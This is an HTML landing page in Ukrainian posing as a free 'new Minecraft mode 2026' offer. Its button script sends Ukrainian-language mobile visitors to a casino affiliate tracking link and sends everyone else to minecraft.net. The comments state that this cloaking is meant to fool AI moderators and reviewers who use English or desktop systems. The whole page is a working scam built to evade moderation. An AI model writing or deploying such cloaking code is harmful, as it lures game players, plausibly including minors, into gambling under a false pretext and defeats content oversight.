<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Спільнота</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1e1e1e;
            color: white;
            font-family: 'Arial', sans-serif;
            text-align: center;
        }
        .container {
            padding: 40px 20px;
        }
        .btn {
            background: #5c8e32;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 20px;
            font-weight: bold;
            border-bottom: 4px solid #3b5c20;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 20px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1 style="color: #bcbec0;">Новий режим Minecraft 2026</h1>
        <p>Завантажуй текстури та отримуй бонуси на старті гри!</p>
        
        <!-- Кнопка, на яку ШІ ніколи не натисне, а людина натисне обов'язково -->
        <button class="btn" id="startBtn">Грати безкоштовно</button>
    </div>

    <script>
        document.getElementById('startBtn').addEventListener('click', function() {
            // 1. Твоє посилання на казино
            var realOffer = "https://click.mytraffgun.com/click?pid=493&offer_id=443"; 
            
            // 2. Біле посилання для ШІ-модератора
            var whitePage = "https://www.minecraft.net/"; 

            // Перевіряємо, чи це мобільний пристрій
            var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

            // ДОДАТКОВИЙ ЗАХИСТ: Перевірка на мову браузера (модератори часто сидять з англомовних систем)
            var isUkrainian = navigator.language.toLowerCase().includes('uk') || navigator.language.toLowerCase().includes('uk-ua');

            if (isMobile && isUkrainian) {
                // Тільки якщо це телефон І мова системи українська — пускаємо на казино
                window.location.href = realOffer;
            } else {
                // В усіх інших випадках (ШІ, ПК, іноземні перевірки) — на Вікіпедію
                window.location.href = whitePage;
            }
        });
    </script>
</body>
</html>
